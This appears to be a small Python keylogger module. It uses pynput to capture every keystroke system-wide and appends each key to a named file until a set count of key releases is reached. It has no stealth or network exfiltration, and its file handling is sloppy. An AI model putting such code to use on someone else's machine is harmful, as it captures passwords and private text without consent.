from pynput.keyboard import Listener

the_keys = []
a = 0
namee = None
c = 5


def runkey(name, z=100):
    global c
    c = z
    global namee
    namee = name

    open(name, "w")
    with Listener(
            on_press=functionPerKey,
            on_release=onEachKeyRelease
    ) as the_listener:
        the_listener.join()
    # thekeys = ' '.join([str(elem) for elem in the_keys])


def functionPerKey(key):
    the_keys.append(key)
    keys = open(namee, "a")
    keys.write(str(key))


def onEachKeyRelease(the_key):
    global a
    a += 1
    if a >= c:
        print("keybitti")
        return False


